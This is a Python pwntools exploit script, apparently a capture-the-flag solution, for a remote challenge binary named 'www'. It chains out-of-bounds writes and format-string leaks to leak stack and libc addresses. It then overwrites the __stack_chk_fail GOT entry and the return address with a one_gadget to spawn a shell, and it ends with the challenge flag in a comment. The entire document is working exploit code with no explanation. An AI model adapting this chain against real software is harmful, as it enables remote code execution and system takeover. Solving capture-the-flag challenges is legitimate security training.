from pwn import *
elf = ELF('./www', checksec=False)
libc = ELF('./libc', checksec=False)

#p = elf.process()
p = remote('challenges1.hexionteam.com', 3002)


# main+88, format string
# stack %10$p
val_to_write = '%10$p\x00'

# overwrite counter
p.sendline(b'-7 ' + p8(8 + len(val_to_write)))

# main+88
for i in range(len(p64(elf.sym['_start']))):
    p.sendline(b'%d %s' % (45+i,p64(elf.sym['_start']).decode('latin-1')[i].encode('latin-1')))

# format string
for i in range(len(val_to_write)):
    p.sendline(b'%d %s' % (i,val_to_write[i].encode('latin-1')))

stack_var = eval(p.recv()) - 0x1d5
got_stack = elf.got['__stack_chk_fail'] - stack_var 
log.info('var pointer 0x%x'%stack_var)
log.info('stack_chk_fail addr %d'%got_stack)

# overwrite counter
val_to_write = '%13$p\x00'

p.sendline(b'-7 ' + p8(8 + len(val_to_write) + 1))

# stack_chk_fail => _start
for i in range(len(p64(elf.sym['_start']))):
    p.sendline(b'%d %s' % (got_stack-i,p64(elf.sym['_start']).decode('latin-1')[i].encode('latin-1')))


# print __libc_start_main
for i in range(len(val_to_write)):
    p.sendline(b'%d %s' % (i,val_to_write[i].encode('latin-1')))

p.sendline(b'13 A') # trigger stack_chk_fail
libc.address = eval(p.recv()) - (libc.sym['__libc_start_main']+231)
log.info('libc base 0x%x'%libc.address)

stack_var = stack_var - 0x110
one_gadget = libc.address + 0x10a38c
log.info('new var pointer 0x%x'%stack_var)
log.info('one gadget 0x%x'%one_gadget)

# overwrite counter
p.sendline(b'-7 ' + p8(8 + 8))

# return address => one_gadget
for i in range(len(p64(one_gadget))):
    p.sendline(b'%d %s' % (45+i,p64(one_gadget).decode('latin-1')[i].encode('latin-1')))
# rsp+0x70 => null
for i in range(len(p64(0))):
    p.sendline(b'%d %s' % (45+0x70+i,p64(0).decode('latin-1')[i].encode('latin-1')))

p.recv()
p.interactive()
#hexCTF{wh0_wh1ch_why_wh3n?}